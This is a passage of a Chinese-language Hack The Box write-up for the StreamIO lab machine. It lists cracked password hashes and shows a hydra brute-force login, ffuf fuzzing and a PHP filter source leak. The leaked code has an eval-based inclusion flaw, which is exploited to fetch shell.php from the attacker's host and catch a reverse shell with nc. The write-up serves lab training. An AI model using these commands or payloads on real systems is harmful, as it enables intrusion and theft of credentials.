<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0049</span>ac57646627b8d7aeaccf8b6a936f    Unknown Not found.<br><span class="hljs-number">08344b</span>85b329d7efd611b7a7743e8a09    md5 ##<span class="hljs-number">123</span>a8j8w5123##<br><span class="hljs-number">083f</span>fae904143c4796e464dac33c1f7d    Unknown Not found.<br><span class="hljs-number">0</span>cfaaaafb559f081df2befbe66686de0    Unknown Not found.<br><span class="hljs-number">1</span>c2b3d8270321140e5153f6637d3ee53    Unknown Not found.<br><span class="hljs-number">22</span>ee218331afd081b0dcd8115284bae3    Unknown Not found.<br><span class="hljs-number">2</span>a4e2cf22dd8fcb45adcb91be1e22ae8    md5 $monique$<span class="hljs-number">1991</span>$<br><span class="hljs-number">35394484</span>d89fcfdb3c5e447fe749d213    Unknown Not found.<br><span class="hljs-number">3577</span>c47eb1e12c8ba021611e1280753c    md5 highschoolmusical<br><span class="hljs-number">384463526</span>d288edcc95fc3701e523bc7    Unknown Not found.<br><span class="hljs-number">3961548825e3</span>e21df5646cafe11c6c76    Unknown Not found.<br><span class="hljs-number">54</span>c88b2dbd7b1a84012fabc1a4c73415    md5 $hadoW<br><span class="hljs-number">665</span>a50ac9eaa781e4f7f04199db97a11    md5 paddpadd<br><span class="hljs-number">6</span>dcd87740abb64edfa36d170f0d5450d    md5 $<span class="hljs-number">3</span>xybitch<br><span class="hljs-number">7</span>df45a9e3de3863807c026ba48e55fb3    Unknown Not found.<br><span class="hljs-number">8097</span>cedd612cc37c29db152b6e9edbd3    Unknown Not found.<br><span class="hljs-number">925e5408</span>ecb67aea449373d668b7359e    Unknown Not found.<br>b22abb47a02b52d5dfa27fb0b534f693    md5 !<span class="hljs-number">5</span>psycho8!<br>b779ba15cedfd22a023c4d8bcf5f2332    md5 <span class="hljs-number">66b</span>oysandgirls..<br>b83439b16f844bd6ffe35c02fe21b3c0    md5 !?Love?!<span class="hljs-number">123</span><br><br>bf55e15b119860a6e6b5a164377da719    Unknown Not found.<br>c660060492d9edcaa8332d89c99c9239    Unknown Not found.<br>d62be0dc82071bccc1322d64ec5b6c51    Unknown Not found.<br>dc332fb5576e9631c9dae83f194f8e70    Unknown Not found.<br>ec33265e5fc8c2f1b0c137bb7b3632b5    Unknown Not found.<br>ee0b8a0937abd60c2882eacb2f8dc49f    md5 physics69i<br>ef8f3d30a856cf166fb8215aca93e9ff    md5 %$clara<br>f03b910e2bd0313a23fdd7575f34a694    Unknown Not found.<br>f87d3c0d6c8fd686aacc6627f1f493a5    md5 !!sabrina$<br>fd78db29173a5cf701bd69027cb9bf6b    Unknown Not found.<br><br>其实这里破解出来的密码不多的，简单梳理下可以用的吧<br><br>##<span class="hljs-number">123</span>a8j8w5123##<br>$monique$<span class="hljs-number">1991</span>$<br>$hadoW<br>paddpadd<br>$<span class="hljs-number">3</span>xybitch<br>!<span class="hljs-number">5</span>psycho8!<br>!?Love?!<span class="hljs-number">123</span><br>physics69i<br>%$clara<br>!!sabrina$<br><span class="hljs-number">66b</span>oysandgirls..<br></code></pre></td></tr></table></figure>

<p>12、既然账号密码都是那个网站的上的 <code>https://streamio.htb/</code> ， 呢就是开始尝试枚举登录吧</p>
<p>13、把上面的用户名和密码分别放到字典列表里，开始进行尝试</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ hydra -L users.txt -p <span class="hljs-string">&#x27;66boysandgirls..&#x27;</span> streamio.htb https-post-form <span class="hljs-string">&quot;/login.php:username=^USER^&amp;password=^PASS^:Login failed&quot;</span><br>Hydra v9<span class="hljs-number">.5</span> (c) <span class="hljs-number">2023</span> by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use in military or secret service organizations, or <span class="hljs-keyword">for</span> illegal <span class="hljs-title function_">purposes</span> <span class="hljs-params">(this is non-binding, these *** ignore laws and ethics anyway)</span>.<br><br><span class="hljs-title function_">Hydra</span> <span class="hljs-params">(https:<span class="hljs-comment">//github.com/vanhauser-thc/thc-hydra) starting at 2024-04-12 00:41:50</span></span><br><span class="hljs-params">[DATA] max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">30</span> login tries (l:<span class="hljs-number">30</span>/p:<span class="hljs-number">1</span>), ~<span class="hljs-number">2</span> tries per task</span><br><span class="hljs-params">[DATA] attacking http-post-forms:<span class="hljs-comment">//streamio.htb:443/login.php:username=^USER^&amp;password=^PASS^:Login failed</span></span><br><span class="hljs-params">[<span class="hljs-number">443</span>][http-post-form] host: streamio.htb   login: yoshihide   password: <span class="hljs-number">66b</span>oysandgirls..</span><br><span class="hljs-params"><span class="hljs-number">1</span> of <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid password found</span><br><span class="hljs-params">Hydra (https:<span class="hljs-comment">//github.com/vanhauser-thc/thc-hydra) finished at 2024-04-12 00:42:22</span></span><br></code></pre></td></tr></table></figure>

<p>14、下面使用上面破解的账号密码进行登录</p>
<p><code>https://streamio.htb/admin/</code></p>
<p><img src="http://sh1yan.top/photo/StreamIO-htb-writeup/15.png" srcset="/img/loading.gif" lazyload></p>
<p>15、通过访问页面，没有发现什么页数的东西，但是可以使用ffuf进行目录枚举下，参数是名称形式的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ffuf -u https:<span class="hljs-comment">//streamio.htb/admin/?FUZZ -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H &#x27;Cookie: PHPSESSID=4fe1ieam8fbpr6ksldsh717gn1&#x27; -fs 1678</span><br><br>        /<span class="hljs-string">&#x27;___\  /&#x27;</span>___\           /<span class="hljs-string">&#x27;___\       </span><br><span class="hljs-string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="hljs-string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="hljs-string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="hljs-string">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="hljs-string">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="hljs-string"></span><br><span class="hljs-string">       v2.1.0-dev</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string"> :: Method           : GET</span><br><span class="hljs-string"> :: URL              : https://streamio.htb/admin/?FUZZ</span><br><span class="hljs-string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt</span><br><span class="hljs-string"> :: Header           : Cookie: PHPSESSID=4fe1ieam8fbpr6ksldsh717gn1</span><br><span class="hljs-string"> :: Follow redirects : false</span><br><span class="hljs-string"> :: Calibration      : false</span><br><span class="hljs-string"> :: Timeout          : 10</span><br><span class="hljs-string"> :: Threads          : 40</span><br><span class="hljs-string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="hljs-string"> :: Filter           : Response size: 1678</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 1191ms]</span><br><span class="hljs-string">staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 1042ms]</span><br><span class="hljs-string">user                    [Status: 200, Size: 2073, Words: 146, Lines: 63, Duration: 460ms]</span><br><span class="hljs-string">:: Progress: [6453/6453] :: Job [1/1] :: 13 req/sec :: Duration: [0:04:43] :: Errors: 20 ::</span><br></code></pre></td></tr></table></figure>

<p>16、访问debug功能，此选项仅适用于开发人员这里进行模糊枚举，发现可以进行包含前期的发现的地址</p>
<p><code>https://streamio.htb/admin/?debug=</code></p>
<p><img src="http://sh1yan.top/photo/StreamIO-htb-writeup/16.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">https:<span class="hljs-comment">//streamio.htb/admin/master.php</span><br><br>https:<span class="hljs-comment">//streamio.htb/admin/?debug=master.php</span><br><br>这里估计是一个文件包含的代码，下面使用PHP的过滤器来查看源码<br><br>php:<span class="hljs-comment">//filter/convert.base64-encode/resource=master.php</span><br></code></pre></td></tr></table></figure>

<p>17、尝试使用过滤器去访问</p>
<p><img src="http://sh1yan.top/photo/StreamIO-htb-writeup/17.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">https:<span class="hljs-comment">//streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php</span><br><br>onlyPGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpLCBhcnJheSgiU2Nyb2xsYWJsZSI9PiJidWZmZXJlZCIpKTsNCn0NCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIG1vdmllcyBvcmRlciBieSBtb3ZpZSI7DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp3aGlsZSgkcm93ID0gc3Fsc3J2X2ZldGNoX2FycmF5KCRyZXMsIFNRTFNSVl9GRVRDSF9BU1NPQykpDQp7DQo/Pg0KDQo8ZGl2Pg0KCTxkaXYgY2xhc3M9ImZvcm0tY29udHJvbCIgc3R5bGU9ImhlaWdodDogM3JlbTsiPg0KCQk8aDQgc3R5bGU9ImZsb2F0OmxlZnQ7Ij48P3BocCBlY2hvICRyb3dbJ21vdmllJ107ID8+PC9oND4NCgkJPGRpdiBzdHlsZT0iZmxvYXQ6cmlnaHQ7cGFkZGluZy1yaWdodDogMjVweDsiPg0KCQkJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ij9tb3ZpZT0iPg0KCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im1vdmllX2lkIiB2YWx1ZT0iPD9waHAgZWNobyAkcm93WydpZCddOyA/PiI+DQoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLXByaW1hcnkiIHZhbHVlPSJEZWxldGUiPg0KCQkJPC9mb3JtPg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCjwvZGl2Pg0KPD9waHANCn0gIyB3aGlsZSBlbmQNCj8+DQo8YnI+PGhyPjxicj4NCjxoMT5TdGFmZiBtYW5hZ21lbnQ8L2gxPg0KPD9waHANCmlmKCFkZWZpbmVkKCdpbmNsdWRlZCcpKQ0KCWRpZSgiT25seSBhY2Nlc3NhYmxlIHRocm91Z2ggaW5jbHVkZXMiKTsNCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIHVzZXJzIHdoZXJlIGlzX3N0YWZmID0gMSAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0KaWYoaXNzZXQoJF9QT1NUWydzdGFmZl9pZCddKSkNCnsNCj8+DQo8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj4gTWVzc2FnZSBzZW50IHRvIGFkbWluaXN0cmF0b3I8L2Rpdj4NCjw/cGhwDQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDEiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3RhZmZfaWQiIHZhbHVlPSI8P3BocCBlY2hvICRyb3dbJ2lkJ107ID8+Ij4NCgkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tcHJpbWFyeSIgdmFsdWU9IkRlbGV0ZSI+DQoJCQk8L2Zvcm0+DQoJCTwvZGl2Pg0KCTwvZGl2Pg0KPC9kaXY+DQo8P3BocA0KfSAjIHdoaWxlIGVuZA0KPz4NCjxicj48aHI+PGJyPg0KPGgxPlVzZXIgbWFuYWdtZW50PC9oMT4NCjw/cGhwDQppZighZGVmaW5lZCgnaW5jbHVkZWQnKSkNCglkaWUoIk9ubHkgYWNjZXNzYWJsZSB0aHJvdWdoIGluY2x1ZGVzIik7DQppZihpc3NldCgkX1BPU1RbJ3VzZXJfaWQnXSkpDQp7DQokcXVlcnkgPSAiZGVsZXRlIGZyb20gdXNlcnMgd2hlcmUgaXNfc3RhZmYgPSAwIGFuZCBpZCA9ICIuJF9QT1NUWyd1c2VyX2lkJ107DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlcl9pZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJHJvd1snaWQnXTsgPz4iPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1wcmltYXJ5IiB2YWx1ZT0iRGVsZXRlIj4NCgkJCTwvZm9ybT4NCgkJPC9kaXY+DQoJPC9kaXY+DQo8L2Rpdj4NCjw/cGhwDQp9ICMgd2hpbGUgZW5kDQo/Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg==    <br></code></pre></td></tr></table></figure>

<p>18、进行解码查看下，核心代码点，发现eval</p>
<p><img src="http://sh1yan.top/photo/StreamIO-htb-writeup/18.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?php<br><span class="hljs-title function_">if</span><span class="hljs-params">(isset($_POST[<span class="hljs-string">&#x27;include&#x27;</span>]))</span><br>&#123;<br><span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">&#x27;include&#x27;</span>] !== <span class="hljs-string">&quot;index.php&quot;</span> ) <br>eval(file_get_contents($_POST[<span class="hljs-string">&#x27;include&#x27;</span>]));<br><span class="hljs-keyword">else</span><br>echo(<span class="hljs-string">&quot; ---- ERROR ---- &quot;</span>);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>

<p>19、file_get_contents()：这是PHP的一个内置函数，用于读取文件并将内容作为字符串返回。当它接收到$_POST[‘include’]作为参数时，会尝试读取该字符串指定的文件路径，并将文件内容读取出来。</p>
<p>20、这不一个命令执行就有了啊，开始尝试，感觉像那个啥，就是返回的太多了，看不到最后的结果了，这里尝试下反弹shell吧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">https:<span class="hljs-comment">//streamio.htb/admin/?debug=master.php</span><br><br>include=http:<span class="hljs-comment">//10.10.14.30/shell.php</span><br><br>curl <span class="hljs-string">&#x27;https://streamio.htb/admin/?debug=master.php&#x27;</span> -H <span class="hljs-string">&#x27;Cookie: PHPSESSID=4fe1ieam8fbpr6ksldsh717gn1&#x27;</span> -d <span class="hljs-string">&#x27;include=http://10.10.14.30/shell.php&#x27;</span><br></code></pre></td></tr></table></figure>

<p><img src="http://sh1yan.top/photo/StreamIO-htb-writeup/19.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ curl -k <span class="hljs-string">&#x27;https://streamio.htb/admin/?debug=master.php&#x27;</span> -H <span class="hljs-string">&#x27;Cookie: PHPSESSID=nhn97rjkt48a0rphkoqf3j9qfv&#x27;</span> -d <span class="hljs-string">&#x27;include=http://10.10.14.30/shell.php&#x27;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ python3 -m http.server <span class="hljs-number">80</span><br>Serving HTTP on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> port <span class="hljs-number">80</span> (http:<span class="hljs-comment">//0.0.0.0:80/) ...</span><br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span> - - [<span class="hljs-number">12</span>/Apr/<span class="hljs-number">2024</span> <span class="hljs-number">01</span>:<span class="hljs-number">33</span>:<span class="hljs-number">08</span>] <span class="hljs-string">&quot;GET /shell.php HTTP/1.0&quot;</span> <span class="hljs-number">200</span> -<br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span> - - [<span class="hljs-number">12</span>/Apr/<span class="hljs-number">2024</span> <span class="hljs-number">01</span>:<span class="hljs-number">35</span>:<span class="hljs-number">10</span>] <span class="hljs-string">&quot;GET /shell.php HTTP/1.0&quot;</span> <span class="hljs-number">200</span> -<br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span> - - [<span class="hljs-number">12</span>/Apr/<span class="hljs-number">2024</span> <span class="hljs-number">01</span>:<span class="hljs-number">38</span>:<span class="hljs-number">50</span>] <span class="hljs-string">&quot;GET /shell.php HTTP/1.0&quot;</span> <span class="hljs-number">200</span> -<br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span> - - [<span class="hljs-number">12</span>/Apr/<span class="hljs-number">2024</span> <span class="hljs-number">01</span>:<span class="hljs-number">45</span>:<span class="hljs-number">40</span>] <span class="hljs-string">&quot;GET /shell.php HTTP/1.0&quot;</span> <span class="hljs-number">200</span> -<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ rlwrap nc -lnvp <span class="hljs-number">443</span>            <br>listening on [any] <span class="hljs-number">443</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.30</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>] <span class="hljs-number">60181</span><br>id<br>PS C:\inetpub\streamio.htb\admin&gt; whoami<br>streamio\yoshihide<br>PS C:\inetpub\streamio.htb\admin&gt; <br></code></pre></td></tr></table></figure>

<p>21、这里我们就获取到了一个初始的shell环境，由于这个是中级靶机，所以到这里还需要枚举信息，来横向移动到另一个用户下，才能获取到第一个flag信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span 